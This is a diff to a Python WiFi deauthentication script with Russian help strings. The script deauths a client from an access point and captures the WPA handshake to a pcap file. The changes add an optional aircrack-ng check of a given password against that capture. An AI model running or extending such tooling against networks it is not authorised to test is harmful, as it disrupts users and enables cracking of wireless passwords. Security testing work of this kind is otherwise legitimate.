@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import time
+import shutil
 import threading
 import argparse
 import pcapy
@@ -25,10 +26,20 @@ parser.add_argument("-b", "--bssid", required=True, help="BSSID точки до�
 parser.add_argument("-s", "--client", required=True, help="MAC-адрес клиента (например, 80:32:53:ae:f8:b2)")
 parser.add_argument("-w", "--pcap-file", required=True, help="Файл для сохранения handshake (например file.pcap)")
 parser.add_argument("-d", "--deauth-count", required=False, type=check_unsigned_int, default=5, help="Количество посылок деавторизации")
+parser.add_argument("-a", "--aircrack-check", required=False, action=argparse.BooleanOptionalAction, help="Проверка пароля при помощи Aircrack-NG")
+parser.add_argument("-p", "--password", required=False, help="Пароль для проверки")
 args = parser.parse_args()
 
+if args.aircrack_check and not args.password:
+	parser.error("Укажи параметр -p или --password, если нужна проверка пароля")
+
+if args.aircrack_check:
+	if shutil.which('aircrack-ng') is None:
+		print("aircrack-ng не установлен!")
+		sys.exit(1)
+
 class WiFiDeauth:
-	def __init__(self, interface, bssid, client, channel, deauth_count, pcap_file):
+	def __init__(self, interface, bssid, client, channel, deauth_count, pcap_file, aircrack_check, password):
 		self.interface = interface
 		self.bssid = bssid.lower()
 		self.client = client.lower()
@@ -63,13 +74,16 @@ class WiFiDeauth:
 		self.keys_receiving_done_flag = False
 		self.keys_receiving_timeout_flag = False
 		
+		self.aircrack_check = aircrack_check
+		self.password = password
+		
 		self.interrupt_flag = False
 		
 		print(f"[+] Switching {args.interface} to channel {args.channel}")
 		subprocess.run(["iwconfig", interface, "channel", str(channel)], capture_output=True, text=True)
 		print(f"[+] Waiting beacon frame from {self.BSSID}")
 	
-	def aircrack_check(self, cap_file, password):
+	def aircrack_check_pass(self, cap_file, password):
 		with open('pass.txt', 'w', encoding="utf-8") as f:
 			f.write(password)
 			
@@ -132,7 +146,7 @@ class WiFiDeauth:
 					print(f"[-] Unknown EAPOL Data!")
 		
 		if (self.current_deauth +1) == self.deauth_count and not self.deauth_done_flag:
-			print("[+] All deauth packets sended")
+			print("[+] All deauth packets sended, waiting last EAPOL messages")
 			self.deauth_done_flag = True
 			self.keys_receiving_start_time = time.time()
 		
@@ -147,6 +161,14 @@ class WiFiDeauth:
 						
 						wrpcap(self.pcap_file, self.packets)
 						print(f"[+] All data saved in \"{self.pcap_file}\"")
+						
+						if self.aircrack_check:
+							print("[+] Running aircrack-ng")
+							if self.aircrack_check_pass(self.pcap_file, self.password):
+								print(f"[+] Aircrack check: OK, password=\"{self.password}\"")
+							else:
+								print(f"[-] Aircrack check: FAIL, password \"{self.password}\" incorrect") 
+						
 						self.interrupt_flag = True
 				else:
 					if not self.keys_receiving_timeout_flag:
@@ -157,5 +179,5 @@ class WiFiDeauth:
 	def start_sniffing(self):
 		sniff(iface=self.interface, prn=self.packet_handler, stop_filter=lambda pkt: (self.interrupt_flag))
 
-sniffer = WiFiDeauth(args.interface, args.bssid, args.client, args.channel, args.deauth_count, args.pcap_file)
+sniffer = WiFiDeauth(args.interface, args.bssid, args.client, args.channel, args.deauth_count, args.pcap_file, args.aircrack_check, args.password)
 sniffer.start_sniffing()
